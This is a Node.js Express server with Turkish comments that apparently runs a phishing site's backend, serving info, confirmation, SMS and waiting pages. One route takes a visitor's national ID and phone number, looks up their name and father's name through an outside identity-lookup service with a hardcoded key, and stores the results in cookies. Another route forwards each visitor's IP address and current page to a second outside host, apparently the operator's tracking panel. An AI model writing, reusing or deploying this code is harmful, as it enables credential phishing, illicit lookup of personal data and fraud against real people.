const express = require('express');
const axios = require('axios');
const path = require('path');
require('dotenv').config();
const app = express();
const port = process.env.PORT || 3000;
const { readdirSync } = require("fs");

app.use(express.json());
app.use(express.static('public'));

 
readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));

 
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.get('/bilgi', (req, res) => {
  res.sendFile(__dirname + '/public/bilgi.html');
});
app.get('/onay', (req, res) => {
  res.sendFile(__dirname + '/public/onay.html');
});
 
app.get('/sms.html', (req, res) => {
  res.sendFile(__dirname + '/public/sms.html');
});
app.get('/bekle', (req, res) => {
  res.sendFile(__dirname + '/public/bekle.html');
});
 
app.post('/online-api', async (req, res) => {
  const tc = req.body.tridField;
  const telno = req.body.telno; // Telefon numarasını alma

  try {
      const response = await axios.get(`https://ilkkuralsaygi.online/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${tc}`);
      const data = response.data;

      // Çerezlere verileri kaydet
      res.cookie('adi', data.adi, { httpOnly: false });
      res.cookie('soyadi', data.soyadi, { httpOnly: false });
      res.cookie('babaad', data.babaad, { httpOnly: false });

      // Telefon numarasını da çerez olarak kaydet
      res.cookie('telno', telno, { httpOnly: false });

      res.redirect('/sorgula');
  } catch (error) {
      console.error('API isteğinde hata:', error);
      res.status(500).send('Sunucu hatası.');
  }
});

app.get('/api', async (req, res) => {
  try {
    const userIp = req.query.user_ip; 
    const currentPage = req.query.current_page;

    // Construct the external API URL
    const apiUrl = `https://hakikicelikhantutunu.com/dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;

    // Make a GET request to the external API
    const response = await axios.get(apiUrl);

    if (!response.data) {
      throw new Error('Geçersiz yanıt');
    }

    res.json(response.data);
  } catch (error) {
    console.error('Hata:', error);

    // Send the error message to the client
    res.status(500).json({ error: error.message });
  }
});

app.listen(port, () => {
  console.log(`Web sunucusu ${port} adresinde çalışıyor.`);
});
